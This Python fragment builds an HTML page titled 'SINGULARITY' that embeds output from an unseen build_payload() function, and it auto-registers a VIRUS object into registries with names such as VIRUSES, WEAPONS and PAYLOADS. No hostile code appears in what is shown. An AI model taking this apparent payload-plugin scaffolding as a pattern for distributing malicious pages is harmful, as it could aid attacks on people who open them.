    sid = sid or new_sid()
    return (
        "<!doctype html><html lang=\"ja\"><head><meta charset=\"utf-8\">"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
        f"<title>{APP_NAME_DEFAULT} {sid}</title>"
        "<style>html,body{margin:0;height:100%;background:#05070a;color:#0f0;"
        "font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace}"
        "body{display:grid;place-items:center}</style></head><body>"
        "<div><b>SINGULARITY</b><br>sid: " + sid + "</div>"
        + build_payload(sid=sid, **opts) +
        "</body></html>"
    )


def register(registry: Any) -> Any:
    if isinstance(registry, dict):
        registry[VIRUS_ID] = VIRUS
    elif isinstance(registry, list):
        registry.append(VIRUS)
    elif isinstance(registry, set):
        registry.add(VIRUS_ID)
    return registry


def autoregister(scope: Optional[Dict[str, Any]] = None) -> Optional[str]:
    scope = scope if scope is not None else globals()
    for name in ("VIRUSES", "VIRUS_MAP", "REGISTRY", "MODES", "WEAPONS", "PAYLOADS", "VIRUS_LIST"):
        c = scope.get(name)
        if isinstance(c, dict):
            c[VIRUS_ID] = VIRUS
            return name
        if isinstance(c, list):
            c.append(VIRUS)
            return name
    return None